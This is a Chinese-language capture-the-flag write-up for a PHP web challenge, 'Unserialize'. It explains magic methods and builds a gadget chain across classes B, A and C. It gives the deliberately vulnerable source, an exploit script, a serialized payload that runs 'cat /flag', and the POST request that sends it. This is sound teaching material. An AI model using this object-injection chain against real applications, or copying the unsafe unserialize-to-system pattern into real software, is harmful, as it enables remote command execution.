---
title: Unserialize
author: SMJB
difficulty: Medium
category: Web
image: ghcr.io/svuctf/svuctf-helloworld-2024/unserialize:latest
port: 80
writeup_author: 13m0n4de
tags:
  - php
  - unserialize
reference:
---

# Unserialize

## 题目描述

## 题目解析

```php
<?php

highlight_file(__FILE__);

class A
{
    public $str;
    public function __invoke()
    {
        echo ($this->str);
        echo ("还差一步，再看看");
    }
}

class B
{
    public $fun;
    public function __destruct()
    {
        ($this->fun)();
    }
}

class C
{
    public $command;
    public function __toString()
    {
        system($this->command);
        return "好像执行了什么";
    }
}

if (isset($_POST['data'])) {
    unserialize($_POST['data']);
} else {
    echo ("你参数呢?");
}
```

这道题主要考察 PHP 的几个知识点：

- 反序列化操作
- PHP 魔术方法的触发
- 对象链的构造

### 序列化和反序列化

**序列化 (Serialize)** 是指将对象转换成可传输或可保存的字符串形式的过程，相当于把内存中的数据结构转成字符串，保留了对象的所有信息。PHP 中使用 `serialize()` 函数进行序列化。

**反序列化 (Unserialize)** 是指将序列化后的字符串恢复成对象的过程，相当于把字符串转回内存中的数据结构。PHP 中使用 `unserialize()` 函数进行反序列化。

### 魔术方法

PHP 中的魔术方法是以 `__` 双下划线开头的特殊方法，会在特定条件下自动调用。比如：

- `__construct()`: 创建对象时自动调用
- `__destruct()`: 对象被销毁时自动调用
- `__toString()`: 当对象被当作字符串使用时自动调用
- `__invoke()`: 当对象被当作函数调用时自动调用
- `__wakeup()`: 在反序列化时自动调用

本题中用到了三个魔术方法：

- `__invoke()`：当对象被当作函数调用时触发
- `__toString()`：当对象被当作字符串使用时触发
- `__destruct()`：当对象被销毁时触发

在 PHP 中，对象会在以下情况被销毁（触发 `__destruct()`）：

- 脚本执行结束时
- 当变量被赋予新的值时
- 当使用 unset() 显式销毁对象时
- 当对象的引用计数变为 0 时

在本题中，`unserialize` 函数执行完毕后程序退出，就会销毁反序列化创建出的对象。

### 解题思路

利用魔术方法的自动调用特性，构造一个对象链：

1. 首先创建 `B` 类对象：当它被销毁时，会调用 `__destruct()`
1. `B` 的 `fun` 属性设置为 `A` 类对象：这样 `__destruct()` 中会把 `A` 对象当作函数调用，触发 `A` 的 `__invoke()`
1. `A` 的 `str` 属性设置为 `C` 类对象：这样 `__invoke()` 中会把 `C` 对象当作字符串使用，触发 `C` 的 `__toString()`
1. `C` 的 `command` 属性设置为要执行的命令：这样 `__toString()` 中就会执行这个命令

### 漏洞利用

利用程序 [exp.php](./writeup/exp.php)：

```php
<?php

class A
{
    public $str;
}

class B
{
    public $fun;
}

class C
{
    public $command;
}

$c = new C();
$c->command = "cat /flag";

$a = new A();
$a->str = $c;

$b = new B();
$b->fun = $a;

echo serialize($b);
```

执行 `php exp.php` 获得序列化字符串，也就是漏洞利用的 Payload：

```
O:1:"B":1:{s:3:"fun";O:1:"A":1:{s:3:"str";O:1:"C":1:{s:7:"command";s:9:"cat /flag";}}}
```

将生成的 Payload 字符串作为 `data` 参数传入：

```
POST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded

data=O:1:"B":1:{s:3:"fun";O:1:"A":1:{s:3:"str";O:1:"C":1:{s:7:"command";s:9:"cat /flag";}}}
```
